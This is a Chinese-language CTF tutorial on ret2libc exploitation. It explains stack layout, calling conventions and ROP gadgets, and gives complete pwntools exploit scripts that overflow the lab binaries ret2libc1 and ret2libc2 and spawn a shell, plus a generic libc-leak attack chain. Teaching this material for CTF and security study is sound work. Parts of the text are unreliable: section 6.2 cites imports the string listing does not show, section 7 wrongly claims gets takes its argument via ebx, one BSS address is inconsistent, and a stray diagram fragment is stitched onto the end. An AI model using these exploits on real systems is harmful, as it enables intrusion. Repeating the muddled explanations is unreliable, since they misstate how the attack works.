## 1. 前置知识

### 1.1 什么是 ret2libc？

**ret2libc**（Return to libc）是一种经典的二进制漏洞利用技术。其核心思想是：

> 控制函数的返回地址，使其跳转到 **libc 库中的函数**（如 `system`），而不是跳转到栈上的 shellcode。

通常情况下，我们选择执行 `system("/bin/sh")` 来获取 shell，因此需要知道 `system` 函数的地址。

### 1.2 为什么需要 ret2libc？

| 场景 | 说明 |
|------|------|
| NX（No-eXecute）保护开启 | 栈上的代码不可执行，无法直接执行 shellcode |
| 栈不可执行 | 传统的栈溢出 + shellcode 方案失效 |
| libc 已加载 | 程序运行时会加载 libc，其中包含大量可用函数 |

### 1.3 关键概念

- **PLT（Procedure Linkage Table）**：过程链接表，存储外部函数的跳转桩代码。`elf.plt['system']` 可以获取 system 的 PLT 地址。
- **GOT（Global Offset Table）**：全局偏移表，存储外部函数的实际运行时地址。
- **BSS 段**：未初始化数据段，通常可读写，可用于存储字符串（如 `/bin/sh`）。

## 2. ret2libc 核心原理

### 2.1 基本思路

```
─────────────────────────────────────────────────────┐
│  1. 找到程序中的溢出点（如 gets、scanf、read 等）       │
│  2. 计算溢出点到返回地址的偏移量                        │
│  3. 构造 payload，覆盖返回地址为 system 的地址           │
│  4. 在 system 返回地址后放置参数 "/bin/sh" 的地址        │
│  5. 触发漏洞，执行 system("/bin/sh")，获取 shell        │
└─────────────────────────────────────────────────────┘
```

### 2.2 栈帧结构（32位）

```
低地址
├──────────────────┐
│  局部变量          │  ← 溢出从这里开始
│  ...             │
│  保存的 EBP       │  ← 覆盖
│  返回地址          │  ← 覆盖为 system 地址
│  system 的返回地址 │  ← 可以是任意值（如 0x0）
│  参数："/bin/sh"   │  ← system 的参数
└──────────────────┘
高地址
```

## 3. 函数调用约定（x86 32位）

### 3.1 cdecl 调用约定

在 x86 32位 Linux 中，函数调用使用 **cdecl** 约定：

- 参数从右到左依次压栈
- 调用者负责清理栈
- 返回值存放在 `eax` 寄存器

```c
// C 代码
system("/bin/sh");

// 对应的栈布局（调用时）
// [esp]     = "/bin/sh" 的地址（第一个参数）
// [esp+4]   = system 的返回地址
```

### 3.2 栈上传参示意

```
调用 system("/bin/sh") 时：

    push "/bin/sh的地址"    ; 参数
    call system             ; 自动 push 返回地址，跳转到 system

等价于栈上布局：

    [返回地址] → system 的 PLT 地址
    [fake_ret] → 任意值（system 返回后跳转到这里）
    [arg1]     → "/bin/sh" 的地址
```

## 4. ROP 与 ret2libc 的关系

### 4.1 什么是 ROP？

**ROP（Return-Oriented Programming）** 是一种利用程序中已有的代码片段（gadget）来执行任意操作的攻击技术。每个 gadget 以 `ret` 指令结尾。

### 4.2 ret2libc 是 ROP 的特例

ret2libc 可以看作是 ROP 的一种简化形式——我们直接跳转到 libc 中的完整函数，而不是拼接多个 gadget。

### 4.3 为什么需要 gadget？

当函数参数需要特殊处理时（如需要先往某处写入数据），就需要借助 gadget 来协调：

```
┌──────────────────────────────────────────────────────┐
│  场景：程序中没有 "/bin/sh" 字符串                      │
│  方案：先用 gets 将 "/bin/sh" 写入 BSS 段，              │
│        再调用 system(BSS地址)                          │
│  问题：gets 需要一个参数（目标地址），                   │
│        如何传递这个参数？                               │
│  答案：使用 pop 指令的 gadget！                          │
└──────────────────────────────────────────────────────┘
```

## 5. 例1：基础 ret2libc（含 /bin/sh 字符串）

### 5.1 题目描述

程序存在栈溢出漏洞，且二进制中**已经包含 `/bin/sh` 字符串**。

### 5.2 分析步骤

```bash
# 1. 检查保护机制
checksec ./ret2libc1

# 2. 查找 /bin/sh 字符串
ROPgadget --binary ./ret2libc1 --string "/bin/sh"
# 或
strings -t x ./ret2libc1 | grep "/bin/sh"

# 3. 查找 system 函数地址
objdump -d ./ret2libc1 | grep system
# 或在 pwntools 中使用 elf.plt['system']

# 4. 确定溢出偏移量
cyclic 200
# 运行程序，输入 cyclic 生成的字符串，观察崩溃位置
cyclic -l <崩溃时的值>
```

### 5.3 漏洞函数分析

```c
// 典型漏洞代码
void vuln() {
    char buf[100];
    gets(buf);  // 无长度限制，可溢出
}
```

### 5.4 Payload 构造

```python
from pwn import *

s = process("./ret2libc1")
elf = ELF("./ret2libc1")

# 获取关键地址
system_addr = elf.plt['system']
binsh_addr = next(elf.search(b'/bin/sh'))

# 构造 payload
# 偏移量 112 = 缓冲区大小 + 保存的 EBP
payload = b'A' * 112 + p32(system_addr) + p32(0) + p32(binsh_addr)
#               ↑ 覆盖返回地址   ↑ fake返回地址  ↑ system的参数

s.sendline(payload)
s.interactive()
```

### 5.5 执行流程图解

```
栈布局（溢出后）：

  低地址
  ├── buf[100]          ← 填充 'A' * 100
  ├── 其他局部变量        ← 填充 'A' * 12
  ├── 保存的 EBP         ← 覆盖（'A' * 4 的一部分）
  ├── 返回地址           ← system@plt 地址
  ├── fake 返回地址      ← 0x00000000（无所谓）
  └── 参数 arg1          ← /bin/sh 地址
  高地址

执行流程：
  vuln() return → system@plt → system("/bin/sh") → 获得 shell
```

## 6. 例2：无 /bin/sh 字符串的 ret2libc

### 6.1 题目描述

与例1类似，但二进制中**没有 `/bin/sh` 字符串**。

### 6.2 字符串分析

通过查看程序的字符串表，发现以下关键信息：

```

LOAD:0804... 00000013  C    /lib/ld-linux.so.2
LOAD:0804... 0000000A  C    libc.so.6
LOAD:0804... 0000000F  C    _IO_stdin_used
LOAD:0804... 00000006  C    srandom
LOAD:0804... 0000000F  C    __isoc99_scanf
LOAD:0804... 00000006  C    stdin
LOAD:0804... 00000007  C    printf
LOAD:0804... 00000007  C    stdout

LOAD:0804... 0000000F  C    __gmon_start__
LOAD:0804... 0000000A  C    GLIBC_2.7

.eh_frame:0.. 00000005  C    ;*2$\"
```

**关键发现**：
- 程序导入了 `system` 函数（PLT 中可用）
- 程序导入了 `gets` 函数（可用于写入数据）
- 程序中有提示字符串 `"What do you think ?"`
- **没有 `/bin/sh` 字符串**

### 6.3 解题思路

既然没有 `/bin/sh`，我们需要**自己构造**这个字符串：

```
──────────────────────────────────────────────────────────┐
│  第一步：利用 gets 函数将 "/bin/sh" 写入 BSS 段            │
│  第二步：调用 system(BSS段地址)，执行 system("/bin/sh")    │
└──────────────────────────────────────────────────────────
```

### 6.4 为什么选 BSS 段？

| 段 | 权限 | 说明 |
|----|------|------|
| .text | r-x | 代码段，只读可执行 |
| .data | rw- | 已初始化数据，可读写 |
| .bss | rw- | 未初始化数据，可读写，内容可控 |

BSS 段可读写且地址固定，适合存储我们写入的字符串。

### 6.5 第一次尝试（有问题的方案）

```python
from pwn import *

s = process("./ret2libc2")
elf = ELF("./ret2libc2")
gdb.attach(s, "b *0x080486C4\n c")

gets = elf.plt['gets']
system = elf.plt['system']
bss = elf.bss(0x300)

# 第一次 payload：调用 gets(bss)，将 /bin/sh 写入 BSS
payload = b'A' * 112 + p32(gets) + p32(0x08048500) + p32(bss)
s.sendlineafter("What do you think ?", payload)

# 发送 /bin/sh 字符串
s.sendline(b'/bin/sh\x00')

# 第二次 payload：调用 system(bss)
payload = b'A' * 112 + p32(system) + p32(0) + p32(bss)
s.sendlineafter("What do you think ?", payload)

s.interactive()
```

### 6.6 问题所在

第一次调用 `gets` 时，`gets` 需要一个参数（目标缓冲区地址）。按照 cdecl 约定，参数应该在栈上：

```
[返回地址] → gets@plt
[fake_ret] → 0x08048500（gets 返回后跳转的地址）
[arg1]     → bss 地址（gets 的参数：写入目标）
```

但这里的问题是：`gets` 执行完后跳转到 `0x08048500`，这个地址可能不是我们想要的后续流程。我们需要更精确地控制执行流。

## 7. 例3：使用 pop_ebx gadget 的 ret2libc

### 7.1 问题升级

在例2的方案中，我们需要：
1. 调用 `gets(bss)` 写入 `/bin/sh`
2. 然后调用 `system(bss)` 执行 shell

**核心问题**：`gets` 函数需要一个参数（目标地址），这个参数如何传递到 `ebx` 寄存器（32位 cdecl 中第一个参数通过栈传递，但某些调用场景需要 gadget 配合）？

### 7.2 pop_ebx gadget 原理

```
──────────────────────────────────────────────────────┐
│  我们需要找到一个 gadget：                              │
│    pop ebx                                            │
│    ret                                                │
│                                                      │
│  这个 gadget 的作用是：                                 │
│    1. 从栈顶弹出一个值到 ebx 寄存器（作为 gets 的参数）   │
│    2. ret 指令弹出下一个值作为返回地址                   │
└──────────────────────────────────────────────────────┘
```

### 7.3 栈布局图解

```
调用 gets(bss) 的完整栈布局：

  低地址
  ├── 填充数据 (A * 112)
  ├── gets@plt 地址          ← 覆盖返回地址，跳转到 gets
  ├── pop_ebx gadget 地址    ← gets 的"返回地址"
  ├── bss 地址               ← pop ebx 弹出到 ebx（gets 的参数）
  ├── system@plt 地址        ← pop_ebx 的 ret 跳转到这里
  ├── 0x00000000             ← system 的 fake 返回地址
  ── bss 地址               ← system 的参数（/bin/sh 所在位置）
  高地址

执行流程：
  1. ret → gets@plt
  2. gets 从 stdin 读取数据写入 ebx（即 bss 地址）
  3. gets 返回 → pop_ebx gadget
  4. pop ebx → 将 bss 地址弹出到 ebx（但这里实际不需要，
     因为 gets 的参数已经在栈上了）
  5. ret → system@plt
  6. system(bss) → 执行 /bin/sh
```

### 7.4 手写栈帧分析图

```
ret func A          pop eax
pop 2 →             pop ebx
→ a → eax           ret
→ b → ebx
→ Ø

解释：
  - 当函数 A 需要两个参数 a 和 b 时
  - 使用 pop eax; pop ebx; ret 这个 gadget
  - 栈上依次放置：gadget地址, a的值, b的值, 下一个函数地址
  - pop eax 取出 a，pop ebx 取出 b，ret 跳转到下一个函数
```

### 7.5 完整 Exploit（exp3.py）

```python
from pwn import *

s = process("./ret2libc2")
elf = ELF("./ret2libc2")
gdb.attach(s, "b *0x080486C4\n c")

gets = elf.plt['gets']
system = elf.plt['system']
bss = elf.bss(0x300)
pop_ebx = 0x0804843d  # pop ebx; ret 的 gadget 地址

# 构造 payload
payload = b'A' * 112
payload += p32(gets)          # 返回地址 → gets@plt
payload += p32(pop_ebx)       # gets 返回后 → pop_ebx gadget
payload += p32(bss)           # pop ebx 弹出 bss 地址（gets 的参数）
payload += p32(system)        # pop_ebx 的 ret → system@plt
payload += p32(0)             # system 的 fake 返回地址
payload += p32(bss)           # system 的参数（/bin/sh 在 bss 中）

s.sendlineafter("What do you think ?", payload)
s.sendline(b'/bin/sh\x00')    # gets 读取的数据

s.interactive()
```

### 7.6 逐步执行流程

```
步骤 1：发送 payload
  └── 程序执行 gets(bss)，等待用户输入

步骤 2：发送 /bin/sh\x00
  └── gets 将 "/bin/sh\x00" 写入 bss 段（0x08048300 + 0x300）

步骤 3：gets 返回
  └── 返回地址是 pop_ebx gadget（0x0804843d）

步骤 4：执行 pop ebx; ret
  └── pop ebx：从栈弹出 bss 地址到 ebx
  └── ret：跳转到 system@plt

步骤 5：执行 system(bss)
  └── bss 中存储着 "/bin/sh\x00"
  └── 等同于执行 system("/bin/sh")

步骤 6：获得 shell！
  └── s.interactive() 进入交互模式
```

## 8. 进阶：ret2libc 的通用思路总结

### 8.1 决策树

```
程序有栈溢出？
  │
  ├── 是 → NX 是否开启？
  │         │
  │         ├── 否 → 直接栈上执行 shellcode（ret2shellcode）
  │         │
  │         ── 是 → 程序中是否有 system 函数？
  │                   │
  │                   ├── 是 → 程序中是否有 "/bin/sh"？
  │                   │         │
  │                   │         ├── 是 → 例1：直接 ret2libc
  │                   │         │         payload = padding + system + fake_ret + binsh
  │                   │         │
  │                   │         └── 否 → 需要自己构造 "/bin/sh"
  │                   │                   │
  │                   │                   ├── 有 gets/scanf/read → 例2/例3
  │                   │                   │   先写入 BSS，再调用 system
  │                   │                   │
  │                   │                   └── 无可写函数 → 需要 ret2libc 完整链
  │                   │                       （泄露 libc 地址 → 计算 system 和 binsh）
  │                   │
  │                   └── 否 → 需要泄露 libc 基地址
  │                             使用 write/puts/printf 泄露 GOT 表内容
  │                             计算 libc 基址 → system 地址 → binsh 地址
  │
  └── 否 → 寻找其他漏洞类型
```

### 8.2 完整 ret2libc 攻击链（泄露 libc 版本）

当程序中既没有 `system` 也没有 `/bin/sh` 时：

```python
from pwn import *

# 第一阶段：泄露 libc 地址
elf = ELF("./pwn")
s = process("./pwn")

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.sym['main']

# 调用 puts(puts_got) 泄露 puts 的实际地址
payload = b'A' * offset + p32(puts_plt) + p32(main_addr) + p32(puts_got)
s.sendlineafter("input:", payload)

# 接收泄露的地址
leaked_addr = u32(s.recv(4))
log.success(f"puts addr: {hex(leaked_addr)}")

# 第二阶段：计算 system 和 /bin/sh 地址
libc = ELF("./libc.so.6")
libc_base = leaked_addr - libc.sym['puts']
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

# 第三阶段：再次溢出，执行 system("/bin/sh")
payload = b'A' * offset + p32(system_addr) + p32(0) + p32(binsh_addr)
s.sendlineafter("input:", payload)

s.interactive()
```

### 8.3 关键要点

| 要点 | 说明 |
|------|------|
| 偏移量计算 | 使用 `cyclic` 或 GDB 精确计算缓冲区到返回地址的距离 |
| 参数传递 | 32位：参数在栈上；64位：参数在寄存器（rdi, rsi, rdx...） |
| gadget 查找 | 使用 `ROPgadget` 或 `ropper` 工具查找合适的 gadget |
| BSS 段利用 | 可读写段，适合存储需要动态构造的数据 |
| 多次溢出 | 有些题目需要多次触发漏洞（第一次泄露，第二次利用） |

## 9. 常用工具与命令速查

### 9.1 信息收集

```bash
# 检查保护机制
checksec ./binary

# 查看文件类型
file ./binary

# 查看字符串
strings ./binary
strings -t x ./binary | grep "/bin/sh"

# 查看导入/导出函数
readelf -s ./binary | grep FUNC
objdump -d ./binary | grep -E "system|gets|printf"
```

### 9.2 Gadget 查找

```bash
# ROPgadget
ROPgadget --binary ./binary --only "pop|ret"
ROPgadget --binary ./binary --string "/bin/sh"

# ropper
ropper --file ./binary --search "pop ebx"
```

### 9.3 调试

```bash
# GDB + pwntools
gdb.attach(s, "b *0x080486C4\n c")

# GDB 查看栈
x/20wx $esp

# GDB 查看 BSS 段内容
x/s 0x0804a300
```

### 9.4 pwntools 常用 API

```python
from pwn import *

# 进程/远程
s = process("./binary")
s = remote("ip", port)

# ELF 分析
elf = ELF("./binary")
elf.plt['system']          # system 的 PLT 地址
elf.got['system']          # system 的 GOT 地址
elf.sym['main']            # main 函数地址
elf.bss(0x300)             # BSS 段偏移 0x300 处的地址
elf.search(b'/bin/sh')     # 搜索字符串

# 数据构造
p32(addr)                  # 32位小端打包
p64(addr)                  # 64位小端打包
u32(data)                  # 32位小端解包
u64(data)                  # 64位小端解包

# 交互
s.sendline(payload)
s.sendlineafter("prompt", payload)
s.recv()
s.recvuntil("marker")
s.interactive()
```

```
│          │     │     └── 需要 pop gadget 传递参数             │
│          │     └── 无可写函数 → 需要 ROP 链构造               │
│          │                                                  │
│          └── 无 system → 泄露 libc 基地址                    │
│                ├── 用 puts/printf 泄露 GOT 表                 │
│                ├── 计算 libc 基址                             │
│                ├── 计算 system 和 /bin/sh 地址                │
│                └── 二次溢出执行 system("/bin/sh")             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```
